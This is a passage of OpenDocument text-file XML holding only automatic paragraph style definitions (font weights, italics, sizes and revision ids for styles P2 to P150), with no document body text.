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5778" officeooo:paragraph-rsid="00095778"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="00095778" officeooo:paragraph-rsid="00095778" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="001c8674" officeooo:paragraph-rsid="001c8674" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="0010de83" officeooo:paragraph-rsid="0010de83" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="001b916c" officeooo:paragraph-rsid="001b916c" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="0020c386" officeooo:paragraph-rsid="0020c386" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="15pt" fo:font-weight="bold" officeooo:rsid="00095778" officeooo:paragraph-rsid="00095778" style:font-size-asian="15pt" style:font-weight-asian="bold" style:font-size-complex="15pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="15pt" fo:font-weight="bold" officeooo:rsid="010ca970" officeooo:paragraph-rsid="010ca970" style:font-size-asian="15pt" style:font-weight-asian="bold" style:font-size-complex="15pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="15pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="006f3341" officeooo:paragraph-rsid="006f3341" style:font-size-asian="15pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="15pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="15pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00a3ae5e" officeooo:paragraph-rsid="00a3ae5e" style:font-size-asian="15pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="15pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000ac122" officeooo:paragraph-rsid="000ac122"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0010de83" officeooo:paragraph-rsid="0010de83"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00129751" officeooo:paragraph-rsid="00129751"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="00152f3a" officeooo:paragraph-rsid="00152f3a"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0016bb08" officeooo:paragraph-rsid="0016bb08"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="italic" officeooo:rsid="0016bb08" officeooo:paragraph-rsid="0016bb08" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="italic" officeooo:rsid="00126a82" officeooo:paragraph-rsid="00126a82" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="italic" officeooo:rsid="00dc2ad3" officeooo:paragraph-rsid="00dc2ad3" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="italic" officeooo:rsid="00dfb226" officeooo:paragraph-rsid="00dfb226" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="italic" officeooo:rsid="00e11db4" officeooo:paragraph-rsid="00e11db4" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="italic" officeooo:rsid="00e29f86" officeooo:paragraph-rsid="00e29f86" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="001b916c" officeooo:paragraph-rsid="001b916c"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0020c386" officeooo:paragraph-rsid="0020c386" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00214e0f" officeooo:paragraph-rsid="00214e0f" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00270055" officeooo:paragraph-rsid="00270055" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0028fc11" officeooo:paragraph-rsid="0028fc11" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0029c827" officeooo:paragraph-rsid="0029c827" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0029c827" officeooo:paragraph-rsid="004095cc" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="002e72bf" officeooo:paragraph-rsid="002e72bf" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00336159" officeooo:paragraph-rsid="00336159" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0036c607" officeooo:paragraph-rsid="0036c607" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00384af8" officeooo:paragraph-rsid="00384af8" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="003c7a44" officeooo:paragraph-rsid="003c7a44" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="004095cc" officeooo:paragraph-rsid="004095cc" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="002008b9" officeooo:paragraph-rsid="002008b9"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="000ac122" officeooo:paragraph-rsid="000ac122" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="004659ae" officeooo:paragraph-rsid="004659ae" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P38" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="004659ae" officeooo:paragraph-rsid="00483c05" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P39" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0046e785" officeooo:paragraph-rsid="0046e785" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P40" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00483c05" officeooo:paragraph-rsid="00483c05" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P41" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0049ef2e" officeooo:paragraph-rsid="0049ef2e" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P42" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="004a59db" officeooo:paragraph-rsid="004a59db" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="004d139c" officeooo:paragraph-rsid="004d139c" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P44" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0050f5bc" officeooo:paragraph-rsid="0050f5bc" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P45" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0052e087" officeooo:paragraph-rsid="0052e087" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P46" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="005859de" officeooo:paragraph-rsid="005859de" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P47" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0058a2ee" officeooo:paragraph-rsid="0058a2ee" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P48" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="005f8bfd" officeooo:paragraph-rsid="005f8bfd" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P49" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0061468a" officeooo:paragraph-rsid="0061468a" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P50" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00662e1b" officeooo:paragraph-rsid="00662e1b" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P51" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="006f3341" officeooo:paragraph-rsid="006289e0" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P52" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00e57d12" officeooo:paragraph-rsid="00e48815" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P53" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00e57d12" officeooo:paragraph-rsid="00e57d12" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P54" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="0046e785" officeooo:paragraph-rsid="0046e785" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P55" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="0049ef2e" officeooo:paragraph-rsid="0049ef2e" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P56" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="004a59db" officeooo:paragraph-rsid="004a59db" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P57" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="005749c7" officeooo:paragraph-rsid="005749c7" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P58" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="006f044a" officeooo:paragraph-rsid="006a589f" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P59" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00d486f7" officeooo:paragraph-rsid="00d486f7" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P60" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00e48815" officeooo:paragraph-rsid="00e48815" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P61" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00686350" officeooo:paragraph-rsid="00686350"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6a589f" officeooo:paragraph-rsid="006a589f" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P63" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00686350" officeooo:paragraph-rsid="00686350" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P64" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" officeooo:rsid="00d24f08" officeooo:paragraph-rsid="00d3c584" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P65" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" officeooo:rsid="00d56f80" officeooo:paragraph-rsid="00d56f80" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P66" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" officeooo:rsid="00dbc79e" officeooo:paragraph-rsid="00dbc79e" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P67" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="006ffbd7" officeooo:paragraph-rsid="006ffbd7"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97f4a9" officeooo:paragraph-rsid="0097f4a9"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a40f99" officeooo:paragraph-rsid="00a40f99"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cbe3ca" officeooo:paragraph-rsid="00cbe3ca"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e6550c" officeooo:paragraph-rsid="00e6550c" style:font-size-asian="14pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P72" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:break-before="page"/>
      <style:text-properties fo:font-size="14pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00f89fca" officeooo:paragraph-rsid="00f89fca"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f89fca" officeooo:paragraph-rsid="00f89fca"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10a7edc" officeooo:paragraph-rsid="010a7edc"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12d24fe" officeooo:paragraph-rsid="012d24fe" style:font-size-asian="14pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P76" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="0078aa62" officeooo:paragraph-rsid="0078aa62" style:font-size-asian="12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6ffbd7" officeooo:paragraph-rsid="0078aa62" style:font-size-asian="12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7bb791" officeooo:paragraph-rsid="007bb791" style:font-size-asian="12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7fb6e3" officeooo:paragraph-rsid="007fb6e3" style:font-size-asian="12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83c77d" officeooo:paragraph-rsid="0083c77d" style:font-size-asian="12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8654be" officeooo:paragraph-rsid="008654be" style:font-size-asian="12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8654be" officeooo:paragraph-rsid="008851ba" style:font-size-asian="12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8a2a2d" officeooo:paragraph-rsid="008a2a2d" style:font-size-asian="12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900df8" officeooo:paragraph-rsid="00900df8" style:font-size-asian="12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902fe1" officeooo:paragraph-rsid="00902fe1" style:font-size-asian="12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92224a" officeooo:paragraph-rsid="0092224a" style:font-size-asian="12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93c11f" officeooo:paragraph-rsid="0093c11f" style:font-size-asian="12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945193" officeooo:paragraph-rsid="00945193" style:font-size-asian="12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95cc12" officeooo:paragraph-rsid="0095cc12" style:font-size-asian="12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973b17" officeooo:paragraph-rsid="00973b17" style:font-size-asian="12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97f6a8" officeooo:paragraph-rsid="0097f6a8" style:font-size-asian="12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9a2ab9" officeooo:paragraph-rsid="009a2ab9" style:font-size-asian="12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9b2748" officeooo:paragraph-rsid="009b2748"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9c2ae8" officeooo:paragraph-rsid="009c2ae8"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9e6b2b" officeooo:paragraph-rsid="009e6b2b" style:font-size-asian="12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a1802d" officeooo:paragraph-rsid="00a1802d" style:font-size-asian="12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a192e6" officeooo:paragraph-rsid="00a192e6" style:font-size-asian="12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a3ae5e" officeooo:paragraph-rsid="00a3ae5e" style:font-size-asian="12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a3ecfb" officeooo:paragraph-rsid="00a3ecfb" style:font-size-asian="12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f89fca" officeooo:paragraph-rsid="00f89fca" style:font-size-asian="12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fc7a1a" officeooo:paragraph-rsid="00fc7a1a" style:font-size-asian="12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fe0e67" officeooo:paragraph-rsid="00fe0e67" style:font-size-asian="12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102b00a" officeooo:paragraph-rsid="0102b00a" style:font-size-asian="12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10406ec" officeooo:paragraph-rsid="010406ec" style:font-size-asian="12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10556d9" officeooo:paragraph-rsid="010556d9" style:font-size-asian="12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a55708" officeooo:paragraph-rsid="00a55708"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a7078b" officeooo:paragraph-rsid="00a7078b"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a7078b" officeooo:paragraph-rsid="00af8ac3"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a8b344" officeooo:paragraph-rsid="00a8b344"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a966cf" officeooo:paragraph-rsid="00a966cf"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af8ac3" officeooo:paragraph-rsid="00af8ac3"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b278c2" officeooo:paragraph-rsid="00b278c2"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b43527" officeooo:paragraph-rsid="00b43527"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b7477e" officeooo:paragraph-rsid="00b7477e"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c372d5" officeooo:paragraph-rsid="00c372d5"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c79370" officeooo:paragraph-rsid="00c79370"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c90d84" officeooo:paragraph-rsid="00c90d84"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cd9b82" officeooo:paragraph-rsid="00cd9b82"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e7d8bc" officeooo:paragraph-rsid="00e7d8bc"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e854c6" officeooo:paragraph-rsid="00e854c6" style:font-size-asian="10.5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0ebebf0" officeooo:paragraph-rsid="00ebebf0"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0ef144e" officeooo:paragraph-rsid="00ef144e" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P123" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00f20970" officeooo:paragraph-rsid="00f20970" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P124" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00f5aae9" officeooo:paragraph-rsid="00f5aae9" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P125" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00f8956b" officeooo:paragraph-rsid="00f5aae9" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P126" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00f8956b" officeooo:paragraph-rsid="00f8956b"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114f25b" officeooo:paragraph-rsid="0114f25b" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P128" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="011b4d36" officeooo:paragraph-rsid="011b4d36"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11ce380" officeooo:paragraph-rsid="011ce380"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121f7c4" officeooo:paragraph-rsid="0121f7c4"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123f0a4" officeooo:paragraph-rsid="0123f0a4"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12ef5f9" officeooo:paragraph-rsid="012ef5f9"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12fbe7d" officeooo:paragraph-rsid="012fbe7d"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style="normal" fo:font-weight="normal" officeooo:rsid="0130aec7" officeooo:paragraph-rsid="0130aec7" style:font-size-asian="10.5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131929f" officeooo:paragraph-rsid="0131929f"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13912ba" officeooo:paragraph-rsid="013912ba"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1399635" officeooo:paragraph-rsid="01399635" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P138" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="0078aa62" officeooo:paragraph-rsid="0078aa62" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P139" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="007e4f5a" officeooo:paragraph-rsid="007e4f5a" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P140" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="0097f4a9" officeooo:paragraph-rsid="0097f4a9" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P141" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="009bf35a" officeooo:paragraph-rsid="009bf35a" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P142" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="009c2ae8" officeooo:paragraph-rsid="009c2ae8" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P143" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00f89fca" officeooo:paragraph-rsid="00f89fca" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P144" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00fe0e67" officeooo:paragraph-rsid="00fe0e67" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P145" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00a8b344" officeooo:paragraph-rsid="00a8b344" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P146" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00a966cf" officeooo:paragraph-rsid="00a966cf" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P147" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00aca343" officeooo:paragraph-rsid="00aca343" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P148" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00c2715f" officeooo:paragraph-rsid="00c2715f" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P149" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00cc0a6b" officeooo:paragraph-rsid="00cc0a6b" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P150" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00e6550c" officeooo:paragraph-rsid="00e6550c" style:font-size-asian="10.5pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
